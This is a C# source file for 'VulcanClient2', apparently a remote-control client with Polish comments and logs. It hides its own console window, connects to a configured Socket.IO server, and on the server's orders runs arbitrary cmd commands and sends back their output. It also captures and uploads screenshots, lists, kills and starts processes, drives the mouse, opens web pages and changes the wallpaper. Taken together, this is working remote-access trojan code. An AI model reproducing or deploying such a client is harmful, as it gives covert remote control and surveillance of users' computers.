using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using SocketIOClient;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using OpenQA.Selenium;
using System.Collections.Generic;
using System.Linq;
using System.ComponentModel;
using System.Net.Sockets;
using Microsoft.Extensions.Configuration;
using System.Runtime.InteropServices;
using System.Threading;
using Serilog;
using Serilog.Events;

namespace VulcanClient2
{
    class ProcessDict
    {
        public string Name { get; set; }
        public int Id { get; set; }
        
        public string MainWindowTitle { get; set; }
    }

    class Program
    {

        public static IWebDriver WebDriver { get; set; }
        public static Uri SocketUri { get; set; }
        public static Uri WebsiteUri { get; set; }

        public static Task Init { get; set; }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static async Task Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Chowamy okno konsoli
            ShowWindow(handle, SW_HIDE);

            Log.Logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .MinimumLevel.Override("Microsoft", LogEventLevel.Warning)
                .Enrich.FromLogContext()
                .WriteTo.File(Directory.GetCurrentDirectory() + "/logs/LogFile.txt")
                .CreateLogger();
            try
            {
                Log.Information("Vulcan Client v.1.0.4");
                var builder = new ConfigurationBuilder()
                    .SetBasePath(Directory.GetCurrentDirectory())
                    .AddJsonFile("config.json");

                var config = builder.Build();
                var adress = config.GetSection("Adress").Value;

                SocketUri = new Uri(adress + "clients");
                var socket = new SocketIO(SocketUri);
                var notification = new Notification(socket);


                socket.OnConnected += Socket_OnConnected;
                socket.OnDisconnected += Socket_onDisconnected;


                socket.On("website", async response =>
                {
                    DriverManager driverManager = new DriverManager();
                    var currentDirectory = Directory.GetCurrentDirectory();
                    string url = response.GetValue(0).Value<string>("url");
                    bool urlIsOk = false;
                    ;
                    try
                    {
                        WebsiteUri = new Uri(url);
                        urlIsOk = true;
                    }
                    catch (UriFormatException e)
                    {
                        await Task.Run(() => notification.Danger.Send(e.Message));
                    }

                    if (urlIsOk)
                    {
                        string fileName;
                        string driverPath = "";
                        try
                        {
                            fileName = driverManager.SelectedDriver.Filename;
                            driverPath = $"{currentDirectory}/drivers/{fileName}";
                        }
                        catch (NullReferenceException e)
                        {
                            Log.Fatal(e, "Wystapil problem z otwieraniem webDrivera");
                            await Task.Run(() => notification.Danger.Send(e.Message));
                        }

                        if (driverPath != "")
                        {
                            if (!File.Exists(driverPath))
                            {
                                Log.Debug("Driver nie istnieje");

                                await driverManager.SelectedDriver.DownloadDriver();

                                RunWebDriver(driverManager, WebsiteUri);
                            }
                            else
                            {
                                Log.Debug("Driver istnieje");
                                RunWebDriver(driverManager, WebsiteUri);
                            }

                            await socket.EmitAsync("website", new
                            {
                                notification = new
                                {
                                    message = $"Pomyślnie uruchomiono strone {url}",
                                    pos = "bottom-right",
                                    status = "success"
                                }
                            });
                        }
                    }
                });

                socket.On("command", async response =>
                {
                    string cmd = "/C " + response.GetValue<string>();

                    var process = new Process();
                    process.StartInfo.FileName = "cmd";
                    process.StartInfo.Arguments = cmd;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.StandardErrorEncoding = Encoding.UTF8;
                    process.StartInfo.StandardOutputEncoding = Encoding.UTF8;

                    process.Start();

                    Log.Information($"Wyslano komende {cmd}");

                    await process.WaitForExitAsync();

                    StreamReader reader = process.StandardOutput;
                    StreamReader errorReader = process.StandardError;

                    string cmdOutput = reader.ReadToEnd();
                    string cmdError = errorReader.ReadToEnd();

                    string output = cmdError != "" ? cmdError : cmdOutput;

                    Log.Debug(output);
                    await socket.EmitAsync("command", new
                    {
                        message = output
                    });
                });

                socket.On("screenshot", async response =>
                {
                    ScreenShoot sc = new ScreenShoot();
                    var imageBytes = sc.CaptureScreenToBytes(ImageFormat.Png);
                    string filename = $"{Guid.NewGuid()}.png";
                    Log.Information("Pomyslnie zrobiono zrzut ekranu");
                    await socket.EmitAsync("get_screenshoot", new
                    {
                        img = imageBytes,
                        filename = filename
                    });
                });

                socket.On("process_list", async response =>
                {
                    List<ProcessDict> processList = new List<ProcessDict>();

                    foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
                    {
                        processList.Add(new ProcessDict
                            {Name = process.ProcessName, Id = process.Id, MainWindowTitle = process.MainWindowTitle});
                    }

                    await socket.EmitAsync("process_list", new
                    {
                        processes = processList
                    });
                });

                socket.On("process_kill", async response =>
                {
                    int processId = response.GetValue(0).Value<int>("processId");
                    foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
                    {
                        if (process.Id == processId)
                        {
                            process.Kill();
                            Log.Information($"Pomyslnie zamknieto proces {processId}");
                            await Task.Run(() => notification.Success.Send($"Pomyslnie zamknieto proces {processId}"));
                        }
                    }
                });

                socket.On("process_start", async response =>
                {
                    string processName = response.GetValue(0).Value<string>("processName");
                    var process = new Process();
                    process.StartInfo.FileName = processName;
                    try
                    {
                        process.Start();
                        Log.Information($"Pomyslnie uruchomino {processName}");
                        await Task.Run(() => notification.Success.Send($"Pomyslnie uruchomino {processName}"));
                    }
                    catch (Win32Exception e)
                    {
                        Log.Fatal(e, $"Wystapil problem z otwieraniem procesu {processName}");
                        await Task.Run(() => notification.Danger.Send(e.Message + $" {processName}"));
                    }

                });
                
                socket.On("mouse", async response =>
                {
                    //int x = response.GetValue(0).Value<int>("x");
                    Log.Debug(response.ToString());
                    string type = response.GetValue(0).Value<string>("type");
                    Log.Debug(type);
                    int p = response.GetValue(0).Value<int>("p");
                    switch(type)
                    {
                        case "x":
                            Mouse.MoveX(p);
                            Log.Debug($"Przesumany x o {p.ToString()}");
                            break;
                            
                        case "y":
                            Mouse.MoveY(p);
                            Log.Debug($"Przesumany y o {p.ToString()}");
                            break;
                    }
                });
                
                socket.On("mouse_click", async response =>
                {
                    string type = response.GetValue(0).Value<string>("type");
                    switch (type)
                    {
                        case "left":
                            Mouse.Click(Win32.MouseEventFlags.LeftDown | Win32.MouseEventFlags.LeftUp);
                            break; 
                        case "right":
                            Mouse.Click(Win32.MouseEventFlags.RightDown | Win32.MouseEventFlags.RightUp);
                            break;
                        case "middle":
                            Mouse.Click(Win32.MouseEventFlags.MiddleDown | Win32.MouseEventFlags.MiddleUp);
                            break;
                    }
                    
                });

                socket.On("wallper", async response =>
                {
                    string wallperUrl = response.GetValue(0).Value<string>("wallper_url");
                    Log.Debug(wallperUrl);
                    Uri wallperUri = new Uri(wallperUrl);
                    Log.Debug(wallperUri.ToString());
                    Wallper.Set(wallperUri, Wallper.Style.Stretched);
                });

                try
                {
                    await socket.ConnectAsync();
                }
                catch (System.Net.WebSockets.WebSocketException e)
                {
                    Log.Fatal(e, "Nie mozna bylo sie polaczyc z serwerem");
                    Log.Debug("Lacze ponownie");
                }

                Console.ReadLine();
            }
            catch (Exception e)
            {
                Log.Fatal(e, "Wystapil problem z aplikacja");
            }
            finally
            {
                Log.CloseAndFlush();
            }
        }
        private static void Socket_OnConnected(object sender, EventArgs e)
        {
            var socket = sender as SocketIO;
            Log.Debug("Klient polaczony " + socket.Id);
        }

        private static void Socket_onDisconnected(object sender, string e)
        {
            Log.Debug("Klient rozlaczony");
        }

        static void RunWebDriver(DriverManager driverManager, Uri url)
        {

            WebDriver = driverManager.SelectedDriver.GetDriver();
            WebDriver.Navigate().GoToUrl(url);
            Log.Information($"Uruchomiono strone {url}");
        }
    }
}